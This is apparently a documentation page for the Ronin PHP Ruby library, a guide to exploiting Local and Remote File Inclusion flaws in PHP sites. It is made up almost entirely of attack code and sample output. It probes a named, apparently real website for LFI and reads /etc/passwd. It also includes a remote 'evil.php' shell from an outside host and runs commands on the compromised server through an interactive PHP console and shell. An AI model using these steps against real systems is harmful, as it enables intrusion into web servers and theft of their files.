---
layout: default
title: Using Ronin PHP
---

# Using Ronin PHP

The [Ronin PHP](http://ronin.rubyforge.org/docs/ronin-php/) library provides
support for PHP related security tasks, such as Local File Inclusion (LFI)
or Remote File Inclusion (RFI).

Before we can use this library in the Ronin Ruby Console, we must first
install the library. To install the Ronin Web library used in this guide,
simply run the following command:

    $ sudo gem install ronin-php

To start the Ronin Ruby Console, with ronin-php pre-loaded, simply run the
`ronin-php` command:

    $ ronin-php

## Local File Inclusion (LFI)

Test a URL for LFI:

    url = URI('http://www.e-builds.com/?page=Portfolio')
    url.has_lfi?
    # => true

Obtain a [Ronin::PHP::LFI](http://ronin.rubyforge.org/docs/ronin-php/Ronin/PHP/LFI.html)
object which can be used to access files or finger-print the web server:

    lfi = url.first_lfi

Request a local file as a `String`:

    lfi.get('/etc/passwd')

Request a local file as a [Ronin::PHP::LFI::File](http://ronin.rubyforge.org/docs/ronin-php/Ronin/PHP/LFI/File.html)
object:

    lfi.include('/etc/passwd')
    # => #<Ronin::PHP::LFI::File:/etc/passwd>

## Remote File Inclusion (RFI)

Test a URL for RFI:

    url = URL('http://www.example.com/page.php?layout=default')
    url.has_rfi?
    # => true

Obtain a [Ronin::PHP::RFI](http://ronin.rubyforge.org/docs/ronin-php/Ronin/PHP/RFI.html)
object which can be used to include other PHP files:

    rfi = url.first_rfi

Including a remote PHP file:

    rfi.include('http://www.shells4you.com/evil.php')

Using the Ronin PHP Remote Procedure Call (RPC) server:

    client = rfi.rpc

Using the PHP Console service to call PHP functions:

    php = client.console

    php.phpversion
    # => "4.3.10"

    php.php_uname('-m')
    # => "i686"

Using the PHP Shell service for quick command execution:

    shell = client.shell

    shell.cwd
    # => "/var/www/site/\n"

    shell.cd '..'
    # => ""

    shell.exec('date -u')
    # => "Thu Aug 21 10:29:38 UTC 2008\n"

    shell.system('ps')
    #    PID TTY          TIME CMD
    #  27042 pts/8    00:00:00 bash
    #  27841 pts/8    00:00:00 ps
    # => nil

Using the Interactive Shell for the PHP-RPC Console service:

    php.interact
    # >> phpversion();
    # => "4.3.0"
    # >> explode('|', 'one|two|three');
    # => Array(
    #   "one",
    #   "two",
    #   "three"
    # )
    # >> exit
    # => nil

Using the Interactive Shell for the PHP-RPC Shell service:

    shell.interact
    # $ pwd
    # /var/www/site/
    # $ cd ..
    # $ ls -la
    # ...
    # $ exit
    # => nil

